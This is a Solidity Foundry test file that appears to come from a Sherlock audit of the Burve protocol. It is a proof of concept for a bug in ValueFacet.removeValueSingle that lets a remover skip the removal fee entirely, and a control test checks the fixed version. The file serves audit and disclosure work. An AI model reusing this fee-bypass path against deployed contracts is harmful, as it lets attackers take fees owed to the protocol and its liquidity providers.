// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

import {
    Exploit,
    ValueFacet,
    ValueFacetFixed,
    Token,
    Closure,
    Vertex,
    FullMath
} from "./56955-h-6-fee-bypass-in-valuefacetremovevaluesingle-sherlock-bur.sol";

// Burve H-6: Fee Bypass in ValueFacet.removeValueSingle (sherlock 2025-04-burve).
// realTax is prorated from the still-zero named return `removedBalance` instead
// of `realRemoved`, so realTax == 0 for every single-token removal: the protocol
// books no fee and the remover keeps the full amount (100% fee bypass).
contract PoC_56955_BurveFeeBypass is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant REMOVED_NOMINAL = 100e18;
    uint256 internal constant NOMINAL_TAX = 5e18; // the fee the closure priced

    // The exact single-tx Playground path: the bug bypasses the whole fee.
    function test_attacker_bypassesRemoveFee() public {
        Exploit exp = new Exploit();
        exp.run();

        Closure c = exp.closure();
        Token t = exp.token();

        uint256 booked = c.earnings(); // protocol fee actually collected
        uint256 skimmed = t.balanceOf(SINK); // bypassed fee routed to the sink
        uint256 attackerGot = t.balanceOf(address(exp)); // full amount minus what it forwarded

        emit log_named_uint("fee the closure priced (nominalTax)", NOMINAL_TAX);
        emit log_named_uint("fee actually booked by protocol    ", booked);
        emit log_named_uint("fee bypassed (skimmed to sink)     ", skimmed);
        emit log_named_uint("remover received (of 100 removed)  ", attackerGot + skimmed);

        // The protocol booked ZERO fee though the closure priced a 5e18 fee.
        assertEq(booked, 0, "BUG not reproduced: protocol booked a non-zero fee");
        // The full 5e18 fee was bypassed and captured.
        assertEq(skimmed, NOMINAL_TAX, "bypassed fee != priced fee");
        // The remover walked away with the entire 100e18 (fair keep would be 95e18).
        assertEq(attackerGot + skimmed, REMOVED_NOMINAL, "remover did not keep the full amount");
    }

    // Control: the mitigation (realRemoved as the numerator) books the fee and
    // the remover only keeps the post-fee amount — no bypass.
    function test_control_fixedChargesFee() public {
        Token t = new Token();
        Closure c = new Closure();
        Vertex v = new Vertex();
        ValueFacetFixed facet = new ValueFacetFixed(t, c, v);

        t.mint(address(facet), 1_000e18);
        v.fund(1_000e18);
        c.set(REMOVED_NOMINAL, NOMINAL_TAX);

        address remover = address(0xBEEF);
        uint256 got = facet.removeValueSingle(remover, 1, uint128(REMOVED_NOMINAL), 0, address(t), 0);

        emit log_named_uint("fee booked (fixed)     ", c.earnings());
        emit log_named_uint("remover received (fixed)", got);

        assertEq(c.earnings(), NOMINAL_TAX, "fixed path must book the fee");
        assertEq(got, REMOVED_NOMINAL - NOMINAL_TAX, "fixed remover must keep only post-fee amount");
        assertEq(t.balanceOf(remover), REMOVED_NOMINAL - NOMINAL_TAX, "fixed payout mismatch");
    }
}
